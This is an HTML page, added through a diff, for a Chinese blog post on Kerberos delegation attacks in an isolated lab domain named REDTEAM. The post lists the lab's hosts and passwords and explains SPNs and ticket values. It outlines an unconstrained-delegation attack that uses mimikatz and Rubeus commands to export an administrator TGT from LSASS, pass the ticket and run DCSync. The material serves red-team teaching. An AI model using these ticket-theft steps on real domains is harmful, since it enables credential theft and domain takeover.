@@ -1,0 +1,1165 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>委派攻击域情况 | ZQ-Rookie-Hacker&#39;s Blog</title>
+  <meta name="author" content="ZQ-Rookie-Hacker">
+  
+  <meta name="description" content="一、环境拓扑概览
+域名：REDTEAM（NetBIOS 名称），DNS 域名为 REDTEAM.com
+主域控制器：主机名 DC1，IP 192.168.18.10，同时作为主 DNS 服务器
+备份域控制器：主机名 DC2，IP 192.168.18.20，作为备用 DNS 服务器
+成员服务器1：12server1，IP 192.168.18.30，已加入域
+成员服务器2：12server2，IP 192.168.18.40，已加入域
+攻击机：Kali-2025，IP 192.168.18.100，模拟外部攻击者（为实验方便置于同一网络）
+网络模式：仅主机（Host-Only），所有虚拟机处于同一隔离网络 192.168.18.0/24
+
+
+二、Mermaid 域关系图
+
+三、核心表格：账号密码及登录关系
+
+
+账号标识
+密码
+账号类型
+登录格式示例
+认证位置
+可登录主机
+
+
+
+域管理员 Administrator
+QWEasd123
+域账号
+REDTEAM\Administrator 或 administrator@REDTEAM.com
+域控制器
+域内所有计算机（DC&amp;#x2F;成员服务器）
+
+
+域用户 test
+pass@123
+域账号
+REDTEAM\test 或 test@REDTEAM.com
+域控制器
+域内所有计算机
+
+
+域用户 hack
+pass@123
+域账号
+REDTEAM\hack 或 hack@REDTEAM.com
+域控制器
+域内所有计算机
+
+
+域用户 web
+123456
+域账号
+REDTEAM\web 或 web@REDTEAM.com
+域控制器
+域内所有计算机
+
+
+域用户 websec
+123456
+域账号
+REDTEAM\websec 或 websec@REDTEAM.com
+域控制器
+域内所有计算机
+
+
+DC1本地管理员
+（默认）
+本地账号
+.\Administrator 或 DC1\Administrator
+DC1本地SAM
+仅主域控制器 DC1
+
+
+DC2本地管理员
+（默认）
+本地账号
+.\Administrator 或 DC2\Administrator
+DC2本地SAM
+仅备份域控制器 DC2
+
+
+12server1本地管理员
+456789
+本地账号
+.\Administrator 或 12server1\Administrator
+12server1本地SAM
+仅成员服务器 12server1
+
+
+12server2本地管理员
+123456
+本地账号
+.\Administrator 或 12server2\Administrator
+12server2本地SAM
+仅成员服务器 12server2
+
+
+
+登录格式说明：  
+
+域登录：REDTEAM\用户名 或 用户名@REDTEAM.com  
+本地登录：.\用户名 或 计算机名\用户名"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="委派攻击域情况"/>
+  <meta property="og:site_name" content="ZQ-Rookie-Hacker&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/zhuzhuxia.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ZQ-Rookie-Hacker&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 委派攻击域情况</h1>
+		</div>
+	
+
+
+
+
+<!-- Reading progress bar -->
+<div class="reading-progress-bar" id="reading-progress-bar"></div>
+
+
+<div class="row post">
+		<!-- cols -->
+		
+		<div id="top_meta"></div>
+		<div class="col-md-9">
+		
+
+		<!-- content -->
+		<div class="mypage">
+		  
+		  <!-- 文章统计 -->
+		  <div class="article-stats">
+		    <i class="fa fa-file-text"></i> 字数: <span id="word-count">计算中...</span>
+		    <span style="margin-left: 12px;"><i class="fa fa-clock-o"></i> 阅读时长: <span id="reading-time">计算中...</span></span>
+		  </div>
+		  
+		  
+
+		  <h3 id="一、环境拓扑概览"><a href="#一、环境拓扑概览" class="headerlink" title="一、环境拓扑概览"></a>一、环境拓扑概览</h3><ul>
+<li><strong>域名</strong>：<code>REDTEAM</code>（NetBIOS 名称），DNS 域名为 <code>REDTEAM.com</code></li>
+<li><strong>主域控制器</strong>：主机名 <code>DC1</code>，IP <code>192.168.18.10</code>，同时作为主 DNS 服务器</li>
+<li><strong>备份域控制器</strong>：主机名 <code>DC2</code>，IP <code>192.168.18.20</code>，作为备用 DNS 服务器</li>
+<li><strong>成员服务器1</strong>：<code>12server1</code>，IP <code>192.168.18.30</code>，已加入域</li>
+<li><strong>成员服务器2</strong>：<code>12server2</code>，IP <code>192.168.18.40</code>，已加入域</li>
+<li><strong>攻击机</strong>：<code>Kali-2025</code>，IP <code>192.168.18.100</code>，模拟外部攻击者（为实验方便置于同一网络）</li>
+<li><strong>网络模式</strong>：仅主机（Host-Only），所有虚拟机处于同一隔离网络 <code>192.168.18.0/24</code></li>
+</ul>
+<hr>
+<h3 id="二、Mermaid-域关系图"><a href="#二、Mermaid-域关系图" class="headerlink" title="二、Mermaid 域关系图"></a>二、Mermaid 域关系图</h3><p><img src="/images/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%9F%9F%E6%83%85%E5%86%B5/image_1.png" alt="在这里插入图片描述"></p>
+<hr>
+<h3 id="三、核心表格：账号密码及登录关系"><a href="#三、核心表格：账号密码及登录关系" class="headerlink" title="三、核心表格：账号密码及登录关系"></a>三、核心表格：账号密码及登录关系</h3><table>
+<thead>
+<tr>
+<th>账号标识</th>
+<th>密码</th>
+<th>账号类型</th>
+<th>登录格式示例</th>
+<th>认证位置</th>
+<th>可登录主机</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>域管理员 Administrator</strong></td>
+<td><code>QWEasd123</code></td>
+<td>域账号</td>
+<td><code>REDTEAM\Administrator</code> 或 <code>administrator@REDTEAM.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机（DC&#x2F;成员服务器）</td>
+</tr>
+<tr>
+<td><strong>域用户 test</strong></td>
+<td><code>pass@123</code></td>
+<td>域账号</td>
+<td><code>REDTEAM\test</code> 或 <code>test@REDTEAM.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机</td>
+</tr>
+<tr>
+<td><strong>域用户 hack</strong></td>
+<td><code>pass@123</code></td>
+<td>域账号</td>
+<td><code>REDTEAM\hack</code> 或 <code>hack@REDTEAM.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机</td>
+</tr>
+<tr>
+<td><strong>域用户 web</strong></td>
+<td><code>123456</code></td>
+<td>域账号</td>
+<td><code>REDTEAM\web</code> 或 <code>web@REDTEAM.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机</td>
+</tr>
+<tr>
+<td><strong>域用户 websec</strong></td>
+<td><code>123456</code></td>
+<td>域账号</td>
+<td><code>REDTEAM\websec</code> 或 <code>websec@REDTEAM.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机</td>
+</tr>
+<tr>
+<td><strong>DC1本地管理员</strong></td>
+<td>（默认）</td>
+<td>本地账号</td>
+<td><code>.\Administrator</code> 或 <code>DC1\Administrator</code></td>
+<td>DC1本地SAM</td>
+<td>仅主域控制器 <code>DC1</code></td>
+</tr>
+<tr>
+<td><strong>DC2本地管理员</strong></td>
+<td>（默认）</td>
+<td>本地账号</td>
+<td><code>.\Administrator</code> 或 <code>DC2\Administrator</code></td>
+<td>DC2本地SAM</td>
+<td>仅备份域控制器 <code>DC2</code></td>
+</tr>
+<tr>
+<td><strong>12server1本地管理员</strong></td>
+<td><code>456789</code></td>
+<td>本地账号</td>
+<td><code>.\Administrator</code> 或 <code>12server1\Administrator</code></td>
+<td>12server1本地SAM</td>
+<td>仅成员服务器 <code>12server1</code></td>
+</tr>
+<tr>
+<td><strong>12server2本地管理员</strong></td>
+<td><code>123456</code></td>
+<td>本地账号</td>
+<td><code>.\Administrator</code> 或 <code>12server2\Administrator</code></td>
+<td>12server2本地SAM</td>
+<td>仅成员服务器 <code>12server2</code></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>登录格式说明</strong>：  </p>
+<ul>
+<li>域登录：<code>REDTEAM\用户名</code> 或 <code>用户名@REDTEAM.com</code>  </li>
+<li>本地登录：<code>.\用户名</code> 或 <code>计算机名\用户名</code></li>
+</ul>
+</blockquote>
+<hr>
+<h3 id="四、域登录机制"><a href="#四、域登录机制" class="headerlink" title="四、域登录机制"></a>四、域登录机制</h3><ol>
+<li><p><strong>非域控制器上登录域用户</strong>：  </p>
+<ul>
+<li>本机向域控制器发送验证请求：验证用户提供的域账号和密码。  </li>
+<li>域控制器核对 Active Directory 中的账号信息后返回结果。  </li>
+<li>验证通过后，允许用户登录本机，并在本机创建用户配置文件（<code>C:\Users\用户名</code>）。</li>
+</ul>
+</li>
+<li><p><strong>域用户的权限</strong>：  </p>
+<ul>
+<li>域用户在特定计算机上的权限取决于该域账号被加入的本地组（如 Administrators、Remote Desktop Users 等），或通过域组策略分配。</li>
+</ul>
+</li>
+<li><p><strong>加入域的过程</strong>：  </p>
+<ul>
+<li>使用域管理员账号（如 <code>REDTEAM\Administrator</code>）临时授权，将计算机添加到域。  </li>
+<li>此管理员账号不会与计算机绑定，之后任何域账号均可登录（除非受限）。</li>
+</ul>
+</li>
+<li><p><strong>域账号的通用性</strong>：  </p>
+<ul>
+<li>一旦计算机加入域，所有域账号理论上都可以登录该计算机（除非被组策略或本地策略明确拒绝）。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="五、常用命令解析"><a href="#五、常用命令解析" class="headerlink" title="五、常用命令解析"></a>五、常用命令解析</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>net accounts /maxpwage:unlimited</code></td>
+<td>设置域账户密码永不过期（常用于服务账号）</td>
+</tr>
+<tr>
+<td><code>net config workstation</code></td>
+<td>显示当前计算机的工作站配置，验证加域状态</td>
+</tr>
+<tr>
+<td><code>net view /domain:REDTEAM</code></td>
+<td>列出域 <code>REDTEAM</code> 中的所有计算机</td>
+</tr>
+<tr>
+<td><code>net user</code></td>
+<td>列出本地计算机上的所有本地用户账户</td>
+</tr>
+<tr>
+<td><code>whoami</code></td>
+<td>显示当前登录的用户名及所在域&#x2F;计算机</td>
+</tr>
+<tr>
+<td><code>nslookup REDTEAM.com</code></td>
+<td>测试 DNS 解析，应返回主域控 IP <code>192.168.18.10</code></td>
+</tr>
+<tr>
+<td><code>nltest /dclist:REDTEAM.com</code></td>
+<td>列出域中的所有域控制器</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="六、当前状态验证（预期）"><a href="#六、当前状态验证（预期）" class="headerlink" title="六、当前状态验证（预期）"></a>六、当前状态验证（预期）</h3><ul>
+<li><strong>网络连通性</strong>：所有主机在同一 Host-Only 网络，可互相 ping 通（需关闭 Windows 防火墙或放行 ICMP）。  </li>
+<li><strong>DNS解析</strong>：在成员服务器上执行 <code>nslookup REDTEAM.com</code> 应返回 <code>192.168.18.10</code>（主域控）或 <code>192.168.18.20</code>（备域控）。  </li>
+<li><strong>域控可见性</strong>：<code>net view /domain:REDTEAM</code> 应列出域内所有计算机（DC1、DC2、12server1、12server2）。  </li>
+<li><strong>域用户登录测试</strong>：  <ul>
+<li><code>REDTEAM\test</code> 可登录 <code>12server1</code> 和 <code>12server2</code>。  </li>
+<li><code>REDTEAM\hack</code> 可登录 <code>12server1</code> 和 <code>12server2</code>。  </li>
+<li><code>REDTEAM\web</code> 可登录 <code>12server1</code> 和 <code>12server2</code>。  </li>
+<li><code>REDTEAM\websec</code> 可登录 <code>12server1</code> 和 <code>12server2</code>。</li>
+</ul>
+</li>
+<li><strong>本地用户登录测试</strong>：  <ul>
+<li><code>12server1\Administrator</code> 可登录 <code>12server1</code>。  </li>
+<li><code>12server2\Administrator</code> 可登录 <code>12server2</code>。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="七、Kerberos-票据权限层级"><a href="#七、Kerberos-票据权限层级" class="headerlink" title="七、Kerberos 票据权限层级"></a>七、Kerberos 票据权限层级</h2><p>在 Kerberos 认证体系及委派攻击中，攻击者捕获的票据类型决定了其所能模拟的用户权限和后续攻击价值。理解不同票据的权限层级，有助于判断攻击目标的优先级和利用方式。下图展示了 Kerberos 票据的权限金字塔：</p>
+<p><img src="/images/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%9F%9F%E6%83%85%E5%86%B5/image_2.png" alt="在这里插入图片描述"></p>
+<h3 id="7-1-各层级票据的价值说明"><a href="#7-1-各层级票据的价值说明" class="headerlink" title="7.1 各层级票据的价值说明"></a>7.1 各层级票据的价值说明</h3><table>
+<thead>
+<tr>
+<th>层级</th>
+<th>票据类型</th>
+<th>典型用途&#x2F;价值</th>
+<th>攻击示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>⭐⭐⭐⭐⭐</td>
+<td><strong>krbtgt TGT</strong></td>
+<td>域林最高权限，可伪造任意用户票据（黄金票据），完全控制整个域。</td>
+<td>导出 krbtgt 哈希后制作黄金票据。</td>
+</tr>
+<tr>
+<td>⭐⭐⭐⭐</td>
+<td><strong>管理员 TGT</strong></td>
+<td>模拟域管理员，可访问任何域内资源，执行 DCSync。</td>
+<td>从非约束委派主机导出 Administrator 的 TGT。</td>
+</tr>
+<tr>
+<td>⭐⭐⭐⭐</td>
+<td><strong>机器 TGT（域控）</strong></td>
+<td>域控机器账户默认具有 DCSync 权限，可导出所有用户哈希。</td>
+<td>通过 Spooler 漏洞强制域控回连，导出 DC1$ 的 TGT。</td>
+</tr>
+<tr>
+<td>⭐⭐⭐⭐</td>
+<td><strong>服务 TGT（委派）</strong></td>
+<td>配置了约束委派的服务账号，可模拟用户访问特定服务，或用于横向移动。</td>
+<td>利用 websec 用户的 TGT 访问其允许的后端服务。</td>
+</tr>
+<tr>
+<td>⭐⭐⭐</td>
+<td><strong>普通用户 TGT</strong></td>
+<td>模拟普通域用户，用于信息收集、横向移动（如该用户对某机器有本地管理员权限）。</td>
+<td>导出 hack 的 TGT，访问其有权限的 12server1。</td>
+</tr>
+<tr>
+<td>⭐⭐</td>
+<td><strong>服务票据 TGS</strong></td>
+<td>仅能访问特定服务（如 cifs&#x2F;DC1），无法模拟用户申请新票据，但可直接用于访问目标。</td>
+<td>直接使用导出的 cifs 票据访问文件共享。</td>
+</tr>
+<tr>
+<td>⭐</td>
+<td><strong>其他低权限票据</strong></td>
+<td>权限极低，通常仅用于特定服务或本地访问。</td>
+<td>一般无攻击价值。</td>
+</tr>
+</tbody></table>
+<h3 id="7-2-攻击者视角的优先级"><a href="#7-2-攻击者视角的优先级" class="headerlink" title="7.2 攻击者视角的优先级"></a>7.2 攻击者视角的优先级</h3><p>在各类委派攻击中，攻击者应优先关注高价值票据：</p>
+<ol>
+<li><strong>krbtgt TGT</strong>：一旦获得，可直接制作黄金票据，永久后门。</li>
+<li><strong>域管理员 TGT</strong>：直接获得域控权限。</li>
+<li><strong>域控机器账户 TGT</strong>：利用 DCSync 导出所有哈希。</li>
+<li><strong>配置委派的服务账号 TGT</strong>：可能通过 S4U2Proxy 模拟高权限用户。</li>
+<li><strong>普通用户 TGT</strong>：作为横向移动的跳板，逐步提升权限。</li>
+</ol>
+<p>此层级图可以帮助读者直观理解为何攻击者热衷于捕获特定票据，以及不同攻击路径的价值差异。</p>
+<hr>
+<h2 id="八、服务主体名称（SPN）与服务类型详解"><a href="#八、服务主体名称（SPN）与服务类型详解" class="headerlink" title="八、服务主体名称（SPN）与服务类型详解"></a>八、服务主体名称（SPN）与服务类型详解</h2><p>在深入委派攻击之前，必须理解一个核心概念：<strong>服务主体名称（Service Principal Name，SPN）</strong>。SPN 是 Kerberos 协议中用于唯一标识网络服务的“身份证”，它直接决定了攻击者能模拟用户访问什么样的资源。</p>
+<h3 id="8-1-什么是-SPN？"><a href="#8-1-什么是-SPN？" class="headerlink" title="8.1 什么是 SPN？"></a>8.1 什么是 SPN？</h3><p>SPN 是 Kerberos 中服务的唯一标识符，格式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务类型/主机名[:端口][/域名]</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<ul>
+<li><code>cifs/DC1.redteam.club</code>：表示 DC1 上的文件共享服务</li>
+<li><code>http/web.redteam.club</code>：表示 web 服务器上的 HTTP 服务</li>
+<li><code>ldap/DC1.redteam.club</code>：表示域控上的 LDAP 目录服务</li>
+</ul>
+<p>当一个客户端（或服务）希望使用 Kerberos 访问某个服务时，它必须知道该服务的 SPN，并向 KDC 请求针对该 SPN 的服务票据。<strong>没有 SPN 的服务无法通过 Kerberos 进行身份验证</strong>（除非使用 NTLM）。</p>
+<h3 id="8-2-常见服务类型及其攻击价值"><a href="#8-2-常见服务类型及其攻击价值" class="headerlink" title="8.2 常见服务类型及其攻击价值"></a>8.2 常见服务类型及其攻击价值</h3><p>在域渗透中，最常用的服务类型及其对应的攻击场景如下：</p>
+<table>
+<thead>
+<tr>
+<th>服务类型</th>
+<th>全称&#x2F;作用</th>
+<th>攻击场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>cifs</strong></td>
+<td>Common Internet File System</td>
+<td>访问共享文件夹（<code>\\host\c$</code>）、远程执行（smbexec、psexec）等。横向移动最常用。</td>
+</tr>
+<tr>
+<td><strong>http</strong></td>
+<td>HTTP 服务（IIS、Web 应用）</td>
+<td>访问 Web 应用程序，可能结合 Web 漏洞或用于中继攻击。</td>
+</tr>
+<tr>
+<td><strong>ldap</strong></td>
+<td>Lightweight Directory Access Protocol</td>
+<td>查询 Active Directory，进行域信息收集；如果获得 LDAP 票据，可用 DCSync 导出哈希。</td>
+</tr>
+<tr>
+<td><strong>host</strong></td>
+<td>主机综合服务（包括计划任务、WMI 等）</td>
+<td>代表对该主机的完全管理权限，可用于远程执行任意命令。</td>
+</tr>
+<tr>
+<td><strong>rpcss</strong></td>
+<td>RPC 服务</td>
+<td>用于远程过程调用，常与打印机漏洞等结合。</td>
+</tr>
+<tr>
+<td><strong>termsrv</strong></td>
+<td>远程桌面服务（RDP）</td>
+<td>获得远程桌面访问权限。</td>
+</tr>
+<tr>
+<td><strong>mssql</strong></td>
+<td>Microsoft SQL Server</td>
+<td>访问数据库，可能执行 xp_cmdshell 等操作系统命令。</td>
+</tr>
+<tr>
+<td><strong>wsman</strong></td>
+<td>WinRM 服务</td>
+<td>通过 PowerShell 远程管理（WinRM）。</td>
+</tr>
+</tbody></table>
+<p>在约束委派攻击中，服务账号的 <code>msDS-AllowedToDelegateTo</code> 属性里存储的就是允许委派的目标 SPN。攻击者需要根据这些 SPN 来选择攻击目标：例如，如果列表中包含 <code>cifs/DC1</code>，攻击者就能模拟管理员访问域控的共享；如果包含 <code>ldap/DC1</code>，则可能直接 DCSync。</p>
+<h3 id="8-3-SPN-的注册与查询"><a href="#8-3-SPN-的注册与查询" class="headerlink" title="8.3 SPN 的注册与查询"></a>8.3 SPN 的注册与查询</h3><ul>
+<li><p><strong>注册 SPN</strong>：使用 <code>setspn</code> 命令为账号（用户或计算机）添加 SPN。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A &lt;SPN&gt; &lt;账号名&gt;</span><br></pre></td></tr></table></figure>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A cifs/12server2.redteam.club websec</span><br></pre></td></tr></table></figure>
+<p>这为 <code>websec</code> 用户注册了 <code>cifs/12server2.redteam.club</code> 的 SPN，意味着该用户可以代表 Kerberos 客户端访问 <code>12server2</code> 的共享服务。</p>
+</li>
+<li><p><strong>查询 SPN</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -L &lt;账号名&gt;          # 查看账号注册的 SPN</span><br><span class="line">setspn -Q &lt;SPN&gt;             # 查询哪个账号拥有该 SPN</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>PowerShell 查询</strong>：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * <span class="literal">-Properties</span> ServicePrincipalName | <span class="built_in">Select-Object</span> Name, ServicePrincipalName</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="8-4-SPN-与委派的关系"><a href="#8-4-SPN-与委派的关系" class="headerlink" title="8.4 SPN 与委派的关系"></a>8.4 SPN 与委派的关系</h3><p>在委派机制中，SPN 起到了两个关键作用：</p>
+<ol>
+<li><strong>标识目标服务</strong>：约束委派的授权列表（<code>msDS-AllowedToDelegateTo</code>）中存储的是 SPN，指明了服务账号可以模拟用户访问哪些具体服务。</li>
+<li><strong>票据请求的必要条件</strong>：无论是 S4U2Self 还是 S4U2Proxy，都需要向 KDC 提供目标服务的 SPN，才能获取对应的服务票据。</li>
+</ol>
+<p><strong>为什么必须注册 SPN？</strong><br>因为 Kerberos 的底层机制要求服务必须有一个唯一的 SPN，客户端（或中间服务）才能正确请求票据。如果一个账号没有被注册任何 SPN，它就无法作为 Kerberos 服务被访问，自然也谈不上委派。</p>
+<h3 id="8-5-小结：服务类型决定攻击路径"><a href="#8-5-小结：服务类型决定攻击路径" class="headerlink" title="8.5 小结：服务类型决定攻击路径"></a>8.5 小结：服务类型决定攻击路径</h3><p>攻击者在规划委派攻击时，必须首先了解目标服务账号的 SPN 配置：</p>
+<ul>
+<li>如果账号有 <code>cifs</code> SPN，可以访问文件共享，进而可能通过写入启动项等方式获取 shell。</li>
+<li>如果账号有 <code>ldap</code> SPN，可以直接与域控通信，甚至执行 DCSync。</li>
+<li>如果账号有 <code>host</code> SPN，意味着可以远程管理主机，权限极高。</li>
+</ul>
+<p>因此，<strong>SPN 的服务类型直接决定了攻击者能从委派中获得什么能力</strong>，这也是为什么在约束委派攻击命令中必须指定类似 <code>cifs/DC1</code> 的 SPN 的原因。</p>
+<hr>
+<h2 id="九、非约束委派详解"><a href="#九、非约束委派详解" class="headerlink" title="九、非约束委派详解"></a>九、非约束委派详解</h2><p><strong>说明</strong>：本节涉及的攻击主体是配置了非约束委派的计算机（<code>12server1</code>、<code>12server2</code>）和用户 <code>web</code>。这些对象允许攻击者在控制它们后捕获高权限用户的 TGT。</p>
+<h3 id="9-1-设计初衷"><a href="#9-1-设计初衷" class="headerlink" title="9.1 设计初衷"></a>9.1 设计初衷</h3><p>非约束委派是 Kerberos 协议中最早引入的委派机制，其设计初衷是为了解决<strong>多层服务间的身份传递问题</strong>。在典型的分布式应用中，用户往往需要先访问前端服务（例如 Web 服务器），而前端服务又需要代表用户去访问后端服务（例如数据库、文件服务器等）。为了让后端服务能够基于用户的原始身份进行访问控制，就必须有一种机制将用户的身份凭证从前端传递到后端。</p>
+<p>在 Kerberos 环境中，用户的身份由票据（Ticket）证明。如果前端服务能够获得用户的 TGT（票据授予票据），那么它就可以代表用户向 Kerberos 域控制器申请任何服务的票据，从而实现“模拟用户”访问任意后端资源。<strong>非约束委派正是为了实现这种灵活的模拟能力而设计的</strong>：当一台服务器被标记为“信任此用户作为任何服务的委派”时，域控制器在向该服务器发放服务票据的同时，会附带将用户的 TGT 也发送给服务器。这样，服务器就可以在内存中缓存用户的 TGT，后续需要访问其他服务时直接用该 TGT 请求新票据。</p>
+<p>然而，这种设计存在明显安全缺陷：一旦服务器被攻陷，攻击者可以获取所有访问过该服务器的用户的 TGT，进而完全模拟这些用户，造成权限滥用的严重后果。正是由于非约束委派过于宽松，微软后来引入了约束委派和基于资源的约束委派，对委派的范围和目标进行限制，以降低风险。</p>
+<h3 id="9-2-工作原理"><a href="#9-2-工作原理" class="headerlink" title="9.2 工作原理"></a>9.2 工作原理</h3><p>下图展示了非约束委派在正常情况下的工作流程：</p>
+<p><img src="/images/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%9F%9F%E6%83%85%E5%86%B5/image_3.png" alt="在这里插入图片描述"></p>
+<p><strong>关键点说明</strong>：</p>
+<ul>
+<li><strong>步骤③</strong>：域控在返回服务票据（ST）时，额外附带了用户的<strong>TGT（票据授予票据）</strong>，这是非约束委派的核心特征。</li>
+<li><strong>步骤④</strong>：服务A将用户的TGT保存在自己的内存（lsass 进程）中，以便后续模拟该用户。</li>
+<li><strong>步骤⑤~⑦</strong>：服务A利用缓存的TGT向域控申请访问其他服务（服务B）的票据，从而代表用户完成跨服务访问。</li>
+</ul>
+<p>这种机制虽然方便了多层服务调用，但也带来了严重的安全风险：一旦服务A被攻陷，攻击者即可获取所有访问过该服务的用户的 TGT，进而模拟这些用户访问域内任何资源。</p>
+<h3 id="9-3-攻击流程"><a href="#9-3-攻击流程" class="headerlink" title="9.3 攻击流程"></a>9.3 攻击流程</h3><p>在域环境中，如果一台服务器（如 <code>12server2</code>）被配置了<strong>非约束委派</strong>，攻击者控制该服务器后，可诱导域管理员访问它，从而获取管理员的 TGT 票据，进而模拟管理员访问域内任何服务。下图展示了基于当前环境的非约束委派攻击流程：</p>
+<p><img src="/images/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%9F%9F%E6%83%85%E5%86%B5/image_4.png" alt="在这里插入图片描述"></p>
+<p><strong>攻击步骤详细说明</strong>：</p>
+<ol>
+<li><strong>触发条件</strong>：域管理员（<code>REDTEAM\Administrator</code>）使用其账号登录（如通过 WinRM、RDP）到一台配置了<strong>非约束委派</strong>的服务器（<code>12server2</code>）。</li>
+<li><strong>票据请求</strong>：服务器以管理员身份向域控（DC1）请求服务票据（ST），用于自身服务的访问。</li>
+<li><strong>委派检查与额外下发</strong>：域控发现服务器账号具有非约束委派属性，因此在返回服务票据（ST）的同时，将管理员的<strong>TGT（票据授予票据）</strong> 也一并发送给服务器。</li>
+<li><strong>缓存 TGT</strong>：服务器将管理员的 TGT 保存在内存（LSASS 进程）中，以便后续模拟该用户访问其他服务。此 TGT 的服务名称（sname）为 <code>krbtgt/REDTEAM.COM</code>，在导出时文件名通常包含“krbtgt”字样。</li>
+<li><strong>攻击者导出 TGT</strong>：攻击者由于已控制 <code>12server2</code>，使用工具（如 mimikatz 的 <code>sekurlsa::tickets /export</code> 或 Rubeus 的 <code>dump</code>）从 LSASS 内存中导出所有缓存的 Kerberos 票据。其中包含管理员 TGT 的文件名示例：<code>[0;12d40]-2-0-60a10000-Administrator@krbtgt-REDTEAM.COM.kirbi</code>。</li>
+<li><strong>票据传递</strong>：攻击者将导出的 TGT 注入自己的会话（例如使用 mimikatz 的 <code>kerberos::ptt</code> 或 Rubeus 的 <code>ptt</code>），使当前会话获得管理员的身份。</li>
+<li><strong>请求目标服务票据</strong>：攻击者利用注入的 TGT，向域控申请访问目标服务（如域控的文件共享服务 <code>cifs/DC1.redteam.club</code>）的票据。由于拥有管理员的 TGT，域控会返回对应的服务票据（ST2）。</li>
+<li><strong>访问成功</strong>：攻击者使用获得的服务票据访问目标服务，例如执行 <code>dir \\DC1\c$</code>，从而以管理员权限访问域控资源。后续还可使用 Mimikatz 的 <code>lsadump::dcsync</code> 导出域内所有用户哈希，实现完全控制。</li>
+</ol>
+<blockquote>
+<p><strong>注</strong>：导出的 TGT 实质是用户的身份凭证，其服务名称为 <code>krbtgt/域名</code>，攻击者利用它可以向 KDC 申请任何该用户有权访问的服务票据，这正是非约束委派攻击的核心价值。</p>
+</blockquote>
